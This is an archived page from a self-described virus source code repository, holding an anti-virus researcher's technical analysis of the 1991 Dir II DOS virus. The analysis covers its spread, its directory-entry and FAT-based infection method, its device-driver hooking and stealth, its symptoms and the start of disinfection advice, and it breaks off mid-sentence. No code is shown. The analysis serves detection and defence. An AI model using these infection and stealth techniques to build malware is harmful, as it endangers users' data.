<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: dir2_asm</title>
<meta name="KEYWORDS" content="dir2.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for dir2.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center>
<p>
<pre>
1. Discovery

In May 1991, a new virus appeared in Bulgaria. This is not news by
itself, since such things happen there almost every week, had it not
been some disturbing properties of this one.

As it is often true for most of the Bulgarian viruses, the authors of
this virus are known. They are two kids, pupils in the High School of
Mathematics in Varna - a town on the Black Sea. They are well-known
virus writers - they have also written the Shake, Dir and MG viruses,
most of which have several variants. When asked why do they write and
release viruses, they reply that they are doing this, because "it's so
interesting" and "for fun". These people continue actively to write and
release viruses - having in mind that such activities are not considered
as a crime in Bulgaria, they have nothing to fear from the law.

All their viruses have the property to infect their victims when the DIR
command is used. So does the new virus, with one particular differece.
It does this extremely fast and often. That's why it is terribly
infectious.

The virus was first discovered and reported by Nikolay Spahiev from
Varna, who posted a short message about it on the FidoNet VIRUS
conference. Unfortunately, nobody seemed to take the message seriously.

2. Naming

In this original message, the virus was called "MG series II". Now this
virus is known under several other names as well - Dir II being one of
the most widely used. Some people proposed to call it the Cluster virus,
beacuse of the particular method which it uses to infect the disks. Such
name however is as unapropriate, as "Stealth virus", since it describes
a general method, which will be probably used by other viruses in the
future too. The authors of the viruses call it "Creeping Death", which
is also inapropriate, since the virus neither "creeps" (due to the speed
of its spread it can be said that it "flies"), nor it is intentionally
destructive - therefore "death" is also inapropriate. Some anti-virus
researchers proposed the name "Cluster virus", which I find
inappropriate as well, since it describes a general method of infection.
Such name is as bad, as "Stealth virus", for instance.

3. Spreading

The virus spread in Bulgaria like wildfire. In fact, at the Laboratory
of Computer Virology in Sofia we just stopped receiving reports for any
other viruses! (This can be partially explained by the fact that if a
disk is infected by this virus and the virus is not in memory, reading
the files, whose directory entries are infected, will show only the
virus body and therefore mask any other viruses present in the files.)
Currently I have reports that this virus is escaped Bulgaria and is
extremely widespread in the Soviet Union, Poland, Hungary, Yougoslavia;
there are also some (uncomfirmed) reports about Norway and Taiwan.

4. Infection method

The Dir II virus uses a completely new type of infection, which makes it
a new kind of computer virus. It is neither file, nor boot/partition
table sector infector, nor both. It infects... directory entries!

4.1. General description

Indeed, the directory entry for each file consists of 32 bytes. They
contain the file name (8 bytes), extension (3 bytes), length (4 bytes),
attributes (1 byte), date (2 bytes) and time (2 bytes) of last
modification of the file, and a pointer (2 bytes) to the first disk
cluster, occupied by the file. The rest 10 bytes are not used. When the
virus infects a directory entry, it modifies the pointer to the first
file cluster in such a way, that the latter begins to point at the
cluster where the virus body resides. The original contents of the
pointer is encrypted and stored in the last two of the reserved 10 bytes
of the directory entry. The encryption is based on a key which is
different for different disks (it depends on the DOS partition size, the
number of clusters on the disk, the number of sectors in a cluster,
etc.), and the encryption algorithm itself is computationally difficult
enough, to make the decryption impossible "by hand".

4.2. Disk infection

Each time a non-infected disk(ette) is accessed, the virus writes its
body over the last cluster of the medium, which is not marked as bad. No
check is done to see whether the cluster is already in use by a file.
Therefore, the virus will destroy files, which happen to occupy the last
disk cluster. Such files are usually backups or archives, which often
fill the entire diskette. Unfortunately, when such diskette becomes
infected, the destruction of the last cluster usually means that the
whole archive or backup is rendered unusable.

The virus body is exactly 1024 bytes long. It's as tricky as the Number
of the Beast (i.e., the same amount of tricks per byte), but is twice as
long. Therefore it occupies two sectors (of 512 bytes each). This means
that one cluster is usually large enough to hold the virus body - the
360 Kb and 720 Kb diskettes use 1 Kb (= 1024 bytes) clusters, and the
hard disks use 2, 4, or 8 Kb clusters, depending on the disk size.
However, on high-capcity diskettes (1.2 Mb and 1.44 Mb), the cluster
size is only one sector, or 512 bytes. This is obviously unsufficient to
hold the virus body. However, the virus recognizes such diskettes and
stores its body in the two last clusters, which are both consequtive and
not marked as bad.

The cluster, used by the virus, is marked in the FAT as occupied (not as
bad, like most boot sector viruses do). For this purpose, the special
value 0(F)FFEh is used. (This notation means that the value is 0FFEh for
12-bit FATs and 0FFFEh for 16-bit ones.) DOS interprets this value as
"End Of File" marker. In fact, any value from 0(F)FF8h to 0(F)FFFh is
interpretted this way, but when DOS puts a end-of-file marker in the
FAT, it always uses the value 0(F)FFFh.

Another particularity of the virus is that the cluster occupied by it is
marked as used only in the first copy of the FAT. Therefore, just after
the infection of the disk, the two copies of the FAT are not equal. Some
disk repairing programs (like Norton Disk Doctor) may notice this and
propose to repair the problem. This offer should not be accepted, since
it will lead to the destruction of all executable files, which directory
entries are infected; see below.

The virus is not able to infect disk partitions, which are accessed
through an installable device driver. Therefore, partitions accessed
through programs like Disk Manager, Stacker, or DiskReet (a disk
encryption device driver from the famous Norton Utilities package) are
immune against this virus.

Also, the virus will not run on MS-DOS 5.0 or any other version, for
which the disk device drivers to not reside in segment 70h in memory.
Don't have a copy of DOS 2.0 to check. It runs perfectly, however, on
any DOS version 3.0 to 5.00.223-beta.

One last note. Due to the paticular method of infection that this virus
uses, it is not possible to "catch" it by downloading a file from a BBS
- just as it is not possible to catch a boot sector virus this way. In
order to become infected, you have to execute a file from a diskette,
which directory entry is infected.

4.3. Directory entry infection

Each time a disk sector is accessed (it doesn't matter whether the
access is for reading or for writing), the virus checks whether the
sector seems to contain directory entries, that belong to executable
files. They are recognized by the "COM" and "EXE" strings, appearing at
the appropriate offsets (i.e., in the supposed extension fields of the
directory entry).

A supplementary check is made on the supposed FileLength and Attributes
fields of the directory entry. Directory entries of files that are
smaller than 2048 bytes are not infected. There is also an upper limit
for the file size, but it is large enough - something about 4 Mb.

The virus does not check for the two hidden DOS files explicitely, but
it does not try to infect them (which would make the system unbootable).
The reason is that it just does not "infect" directory entries, which
have the System, or Directory, or VolumeLabel attribute on.

One funny thing is that the directory entries, marked as deleted, are
also infected - if they belong to COM or EXE files, of course.
Therefore, if when removing the virus you do not disinfect the deleted
directory entries as well, undeleting them afterwards will cause a
re-infection if the system.

5. Memory installation

When a file, which directory entry is infected, is run on a clean
system, the virus installs itself in memory, marking its current PSP as
0008 (as if it belongs to COMMAND.COM). MAPMEM will show that
COMMAND.COM occupies three memory blocks. Afterwards, the virus tries to
execute a file with the name consisting of one character with ASCII code
0FFh in the current directory of drive C:. Of course, such file will not
be found, which will lead to the search of the current directory on
drive C: and of all directories, listed in the PATH variable. Since the
virus infects the directory entries on any sector operation with a
directory sector, this will lead to the infection of all executable
files in these directories.

When a machine with an infected command interpretter is booted, the
virus detects this and installs itself in memory in a different way. It
waits until the command interpreter's memory control block is created
and then extends it and copies itself in the added space. Therefore,
when you boot an infected system, you won't be able to notice three MCB
belonging to the command interpretter - there will be only two, as
usual, but one of them will be about 1.5 Kb larger.

6. Getting control

The virus does not use any interrupts (and does not intercept any of
them). It patches itself in the DOS disk device drivers chain and
intercepts the device drivers requests.

All the three possible kinds of disk device driver calls are
intercepted. InputSector and OutputSector are used to infect disks and
directory entries (and for hiding the virus, using stealth techniques;
see below). The call BuildBPB is also intercepted by the virus. Normally
this call returns various status information about the disk. The virus
intercepts it and modifies the returned disk size, so that the disk
looks two sectors "shorter". This way, when the virus is active in
memory, it is not possible to access the sectors, where its body
resides.

7. Stealth techniques used

Besides of hiding its body, using the trick, described above, the virus
also hides the modification of the directory entries.

If you consider the way the virus infects them, you'll notice that all
files, which directory entries are infected, look as if all of them are
cross-linked to the last disk cluster. And indeed, if you boot from a
non-infected system diskette (to ensure that the virus is not present in
memory) and run CHKDSK (don't use the /F option!), it will report a huge
number of cross-linked files and the same number of lost file chains.

However, when the virus is resident in memory and active, on each access
of a directory sector (via the InputSector disk device driver call; see
above), it will determine whether the sector contains any infected
directory entries, and  will temporary change them to non-infected in
memory. Therefore, with an active virus in memory, it is not possible
for the user to "see" the virus infection - the virus is fully stealth.

Since the virus does not execute any interrupts and does not try to
write to the files either, none of the currently available monitoring
programs are able to intercept it. Even some smart hardware cards that
try to prevent direct disk access and file modification, are unable to
detect and stop the virus, since (1) there is no file modification and
(2) the interrupts for direct disk writing seem to come from the DOS
device drivers, and therefore seem perfectly legal. Only hardware
protection that denies any kind of disk writing is able to stop the
virus.

Since the virus is fully stealth, it's rather hopeless to rely on
checksumming programs if there is a possibility that it is active in
memory. ALWAYS BOOT FROM A NON-INFECTED WRITE-PROTECTED SYSTEM DISKETTE
before trying to check for viruses! Furthermore, a checksummer, which
tries to be too smart and instead of doing file I/O tries to remember on
which sectors the files reside and then access these sectors through
direct BIOS calls and checksum them, will be totally useless against
this virus, even if the virus is not in memory. The reason for this is,
of course, that the files are never modified, or even moved from the
sectors they occupy before infection.

8. Destructive effects

The virus is not intentionally destructive (that is, it contains no
destructive or any other payload). However, due to its method of
infection, it may destroy data. First of all, the virus writes it's body
over the last cluster of the disk (or to the last two sectors, whichever
is larger), which is not marked as bad. It does not check whether the
sector is already in use or not. Therefore, it will destroy part of a
file (or directory) which happens to use this cluster(s). Since the
virus body is written on any accessed disk, regardless whether the
latter contains executable files, the destruction of information
described above occurs most often on backup diskettes or diskettes that
contain only one large archive file, or that are otherwise full up to
the last cluster. Since the DOS program BACKUP tends to write its
control information in a small files -after- the backup, such
destruction will damage it and make the the whole backup unusable.

The second kind of damage occurs if the user notices that something is
wrong, boots from a non-infected disk, and runs CHKDSK/F, Norton Disk
Doctor, or another disk repairing program. As was mentioned above, all
executable files, whose directory entries are infected, will be lost.
Since the virus marks its body as occupied cluster only in the first
copy of the FAT, the user is often tempted to believe that there is just
something wrong with the FAT and to run Norton Disk Doctor. Therefore,
the main damage is usually caused by the incompetent actions of the
user. One of my colleages even proposed to call this virus "Do it
yourself", because the damage is caused by the victim... In general, it
is always a good idea if you suspect that you are infected by a virus,
to contact a competent virus specialist, instead of trying to repair the
problem yourselves. Otherwise the results might be desastrous, as the
example with this particular virus shows...

After running the disk repairing program, as described above, all
executable files, which directory entries are infected, will bocome one
cluster long (or 1024 bytes, whichever is larger) and will contain
nothing but the virus body. You'll observe the same effect if you try to
copy a file when the virus is not in memory - you'll be able to copy
only the virus body, not the file which directory entry is infected.
However, this copy of the virus will be fully functional and will infect
perfectly!

9. Symptoms

Here is a summary of some symptoms, that might indicate infection by
this virus:

1) Backups and/or archives that use the whole disk space on the diskette
suddenly become corrupted.

2) After formatting a diskette and looking at the disk usage map with PC
Tools (or something similar), you notice that the last sector is marked
as used. Used, not bad.

3) The two copies of the FAT do not match. This can be observed only if
the virus is not active in memory.

4) When you copy files from an infected media (without the virus being
active), only one cluser (or 1024 bytes, whichever is larger) is copied.

5) When you run a file from an infected diskette, it just exits to the
DOS prompt. At this time you're already badly infected. Running the file
for the second time will make it running, though.

6) CHKDSK (DON'T USE THE /F OPTION!!!) or Norton Disk Doctor (or an
equvalent disk repairing program) reports a lot (a huge number of)
cross-linked files and lost file chains. All files are cross-linked to
the last cluster of the disk. This is cluster 355 for 360 Kb floppies.

7) All infected files (both EXE and COM), when viewed on a non-infected
system will start with the bytes BC 00 06...

If you encounter the above problems, for goodness sake, don't try to
repair the problem yourselves!!! You are risking to lose all your
executables. Contact a person, who is qualified in anti-virus research
as soon as possible!

10. Disinfection

A disruptive characteristic of this virus is that if an infected system
is booted from a clean floppy, none of the executable files can be
copied from the system.  Neither can they be backed up.  If the system
is not booted from a clean floppy, then the files can be copied and
backed up, but the virus will copied along with the programs.  It's a
catch 22 situation.

However, this (and any other fully stealth virus) can be removed very
easily, without any anti-virus programs. Just make sure that the virus
